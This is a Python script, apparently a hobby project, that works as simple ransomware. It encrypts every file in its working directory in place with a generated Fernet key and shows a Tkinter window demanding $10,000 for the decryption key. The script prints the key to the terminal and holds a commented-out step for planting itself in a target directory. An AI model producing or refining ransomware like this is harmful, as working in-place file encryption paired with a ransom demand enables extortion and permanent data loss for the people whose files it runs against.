import os
#import shutil

from tkinter import *
from email.message import EmailMessage
from cryptography.fernet import Fernet




# Planting myself in target directory

#origin = os.path.abspath(__file__)
#target = r'/home/vigil/Desktop/exp_zone'

#shutil.move(origin, target)




# Tracking down files

files = []

for file in os.listdir():
    if file == 'Ransom_Encrypt.py' or file == 'vigil.png':
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)




# Key generation and encryption

key = Fernet.generate_key()

print('KEY: ', key.decode('utf-8'))

for file in files:
    with open(file, 'rb') as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, 'wb') as thefile:
        thefile.write(contents_encrypted)

print('--- All Files Have Been ENCRYPTED ---')



# Creat Instruction Window

root = Tk()
root.title('RANSOM ENCRYPTOR')
root.geometry("800x400")


frame_image = Frame(root, borderwidth=2, bg="white", relief=SUNKEN)
frame_image.grid(row=0, column=0)
frame_image.picture = PhotoImage(file="vigil.png")

prompt = Label(text='All your files have been encrypted. \nPay $10,000 to receive decryption key. \n(Key can be seen in terminal)', font=40)
prompt.grid(row=1, column=0)

label = Label(text='Enter key to decrypt files: ', font=40)
label.grid(row=2, column=0)

usr = Entry(root, font=('Arial Black', 12))
usr.grid(row=4, column=0)

def deCrypt():
    string = usr.get()
    usrKey = bytes(string, 'utf-8')
    print(string)

    if usrKey == key:

        # Decryption process

        print('CORRECT')

        for file in files:
            with open(file, 'rb') as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(key).decrypt(contents)
            with open(file, 'wb') as thefile:
                thefile.write(contents_decrypted)

        print('--- All Files Have Been DECRYPTED ---')
    
    else:

        print('INCORRECT')

        nomatch = Label(text='Incorrect key.', font=40)
        nomatch.grid(row=6, column=0)

enter = Button(root, text='Submit', font=40, command=deCrypt)
enter.grid(row=5, column=0)

root.mainloop()
